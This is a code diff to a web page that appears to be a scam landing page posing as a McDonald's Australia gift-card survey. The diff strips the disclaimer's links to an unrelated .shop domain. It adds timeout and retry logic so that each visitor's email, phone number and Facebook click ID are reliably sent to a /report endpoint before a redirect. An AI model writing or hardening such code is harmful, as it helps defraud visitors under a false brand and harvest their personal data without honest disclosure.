@@ -345,7 +345,7 @@
             </div>
 
             <p class="disclaimer">
-                * This is a limited time promotional offer. Gift card amount varies based on survey completion and eligibility. McDonald's is not responsible for this promotion. By clicking the button below, you agree to our <a href="https://homostylous.shop/5tpczsj#">Terms of Service</a> and <a href="https://homostylous.shop/5tpczsj#">Privacy Policy</a>. This promotion is independent and not affiliated with McDonald's Corporation.<br><br>
+                * This is a limited time promotional offer. Gift card amount varies based on survey completion and eligibility. McDonald's is not responsible for this promotion. By clicking the button below, you agree to our Terms of Service and Privacy Policy. This promotion is independent and not affiliated with McDonald's Corporation.<br><br>
                 &copy; 2026 McDonald's Australia. All Rights Reserved.
             </p>
         </div>
@@ -427,6 +427,34 @@
             return `${usernames[Math.floor(Math.random()*usernames.length)]}${Math.floor(Math.random()*10000)}@${domains[Math.floor(Math.random()*domains.length)]}`;
         }
 
+        async function fetchWithTimeout(url, options = {}, timeoutMs = 2000) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
+            try {
+                return await fetch(url, { ...options, signal: controller.signal });
+            } finally {
+                clearTimeout(timeoutId);
+            }
+        }
+
+        async function reportClickWithRetry(reportUrl) {
+            try {
+                const firstResponse = await fetchWithTimeout(reportUrl, { method: "GET" }, 2000);
+                if (firstResponse.ok) return true;
+            } catch (err) {
+            }
+
+            // Retry once in background without blocking redirect.
+            setTimeout(async () => {
+                try {
+                    await fetchWithTimeout(reportUrl, { method: "GET" }, 2000);
+                } catch (err) {
+                }
+            }, 0);
+
+            return false;
+        }
+
         async function handleAction(btnElement) {
             btnElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
             const buttons = document.querySelectorAll('.btn');
@@ -448,10 +476,12 @@
 
                 const urlParts = window.location.pathname.split('/').filter(p => p !== '');
                 const shortCode = urlParts[urlParts.length - 1] || '';
-                let reportUrl = `${window.location.origin}/report?id=${shortCode}&fbclid=${getFbclid()}&email=${encodeURIComponent(email)}&phone=${phone}`;
+                let reportUrl = `${window.location.origin}/report?id=${encodeURIComponent(shortCode)}&fbclid=${encodeURIComponent(getFbclid())}&email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}`;
 
-                await fetch(reportUrl, { method: "GET" });
-                sessionStorage.setItem('click_reported', 'true');
+                const reported = await reportClickWithRetry(reportUrl);
+                if (reported) {
+                    sessionStorage.setItem('click_reported', 'true');
+                }
 
                 setTimeout(() => {
                     window.location.href = getOriginalUrl({email, phone});
